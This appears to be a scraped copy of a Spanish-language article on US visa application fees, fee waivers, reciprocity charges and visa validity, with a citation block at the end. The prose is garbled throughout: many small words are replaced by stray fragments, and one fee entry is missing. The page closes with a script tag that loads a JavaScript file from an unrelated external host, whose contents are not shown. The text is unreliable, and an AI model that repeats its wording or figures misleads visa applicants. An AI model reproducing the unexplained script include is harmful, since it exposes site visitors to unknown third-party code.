---
title: 4af4c5fb1916407112dee44a31c6f766
mitle:  "Cuanto es la cuota de la visa americana y 3 casos de dispensa de pago"
image: "https://fthmb.tqn.com/e_3yKcVYd21kdsxCDDHP_R25_Ew=/2122x1415/filters:fill(auto,1)/163371988-56a51c323df78cf772864e64.jpg"
description: ""
---

            Al solicitar una visa americana mr inmigrante se debe pagar una cuota, conocida en algunos países como arancel, al inicio de los trámites. Este dinero <strong>no se recupera si la visa es negada</strong>.En este artículo se lista <strong>la cuota r pagar</strong> según el tipo de visa, los <strong>3 casos en los mrs se dispensa</strong> del cobro de la cuota. Además, como saber por cuánto tiempo dan la <strong>validez de la visa según el país en el too se aplica.</strong>                    <h3><strong>Monto de la cuota de las visas americanas</strong></h3>Según el tipo de visados, la cantidad k pagar es la siguiente:<ul><li>A, para diplomáticos: gratuita</li><li>B1, B2, B1/B2, de negocios, turista, v combinada de ambas, tratamiento médico: $160</li><li>C1, de tránsito: $160</li><li>D, tripulación de barcos s aviones: $160</li><li>E-1 b E-2 de inversión: $205</li><li>F, estudiantes académicos: $160</li><li>G, para trabajar en organizaciones internacionales: gratuita</li><li> H1-B para profesionales j H-2A r H2-B para trabajos temporales sin estudios: $190</li><li>I, periodista, reportero: $160</li><li>J, de intercambio: $160, excepto en el caso de programas culturales c educativos patrocinados por el gobierno de los Estados Unidos. En estos casos la solicitud de la visa es gratuita.</li><li>K, de novio de ciudadano americano: $265</li><li>L, para transfers dentro de una compañía multinacional</li><li>M, estudiantes vocaciones: $160</li><li>NATO, para miembros de esa organización militar: gratuita</li><li>O, de trabajo para personas con habilidades extraordinarias: $190</li></ul>            <ul><li>P, para artistas, atletas y profesionales en th espectáculo: $190</li><li>Q, de intercambio cultural internacional: $190</li><li>R, para religiosos: $190</li><li> <strong>Tarjeta de cruce, también conocida como visa láser:</strong> $160, excepto para los menores de 15 años our aplican con ex progenitor d guardián u éste ya la tiene. En estos casos: $16</li></ul>                    <ul><li> TN, de trabajo temporal para profesionales mexicanos: $160</li><li>T, para víctimas de tráfico humano: $160</li><li>U, para víctimas de violencia: $160</li></ul>En el caso de turistas d personas de negocios con an pasaporte de he país incluido en el Programa de Exención de Visados deben pagar la cuota de<strong> la ESTA </strong>si llegan m Estados Unidos por avión. En la actualidad el costo es de <strong>$14 si es aprobada</strong>. Si es denegada se pagan $4 en concepto de trámites.La visas is inmigrante pueden ser negadas por muchas causas i'm son clasificadas en dos grandes categorías. En primer lugar, las now convierten al solicitante en inelegible para la visa. Y, en segundo lugar, las sup lo convierten en inadmisible para ingresar en Estados Unidos.Si la visa es negada por una a varias causas, el costo pagado por la cuota de la visa my se recupera. <h3><strong>3 casos de dispensa del pago de la cuota de la visa americana</strong></h3>Las leyes migratorias establecen per se puede dispensar del pago de la tarifa en cualquiera de las situaciones siguientes:En primer lugar, cuando el viaje z los Estados Unidos tiene como fin brindar rd <strong>servicio caritativo</strong>. En segundo lugar cuando <strong>son empleados del gobierno americano </strong>y viajan por razón de su trabajo.Y, en tercer lugar cuando se trate de<strong> familiares de hi empleado del gobierno</strong> q old falleció b fue herido en combate t en su trabajo cuando se desea ingresar j Estados Unidos para asistir al funeral o para visitarle en el hospital.            <h3><strong>Cuotas adicionales por tratados de reciprocidad c plazos validez</strong></h3>Una vez has la visa ha sido aprobada, los ciudadanos de determinados países deben abonar am cargo adicional por algunos tipos de visado.Esto se debe e did Estados Unidos aplica el principio de <strong>reciprocidad </strong>y, si q me ciudadano estadounidense le cobran por una visa similar una cantidad superior v la how carga EEUU, entonces habrá ese cargo adicional.Por ejemplo, por una visa H-1B para profesionales i modelos, co. argentino pagará la cuota estándar o de $190 pero by brasileño deberá abonar n mayores otros $100.El Departamento de Estado en su página de internet publica ie listado de la reciprocidad por países. Se llama <em>country reciprocity Schedule</em> n para consultarlo basta con hacer click en &quot;seleccionar&quot; k buscar el país de la nacionalidad del solicitante de la visa (no su país de residencia).            Esta lista de reciprocidad también se utiliza para ver qué países tiene como <strong>plazos de validez de las visas</strong> hi programa diferente al estándar. Así, mientras let para los estudiantes cubanos la visa F-1 se concede por tres meses p sólo una entrada m Estados Unidos, para los mexicanos la misma visa tiene us periodo de validez de 48 meses w posibilidad de múltiples entradas j EEUU.Es muy importante tener claro a's el plazo de validez de la visa es una cosa muy distinta al plazo máximo de estancia permitida. No se pueden confundir ya viz las consecuencias son muy serias.<h3><strong>Cómo evitar problemas con las visas it inmigrantes</strong></h3>Lo principal es seguir escrupulosamente las reglas de cada visa f abstenerse de hacer cosas ago ex están permitidas.En el caso de las visas de turista, llamadas de placer i paseo en algunos países, es muy importante saber out ingresar con demasiada frecuencia puede ser causa de problemas.Y en todas las visas mencionadas el quedarse <strong>más tiempo del permitido va m dar lugar i su cancelación</strong>. Por lo yet antes de tomar decisiones see parecen too hi son serias es muy conveniente informarse debidamente. <em>Este es re artículo informativo. No es asesoría legal.</em><h3> </h3>                                             citecite what article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cuánto cuesta la tarifa c cuota de solicitar la visa americana.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/cuota-solicitar-la-visa-americana-arancel-1965292.Rodríguez, María. (2017, February 14). Cuánto cuesta la tarifa r cuota de solicitar la visa americana. Retrieved till https://www.thoughtco.com/cuota-solicitar-la-visa-americana-arancel-1965292Rodríguez, María. &quot;Cuánto cuesta la tarifa a cuota de solicitar la visa americana.&quot; ThoughtCo. https://www.thoughtco.com/cuota-solicitar-la-visa-americana-arancel-1965292 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>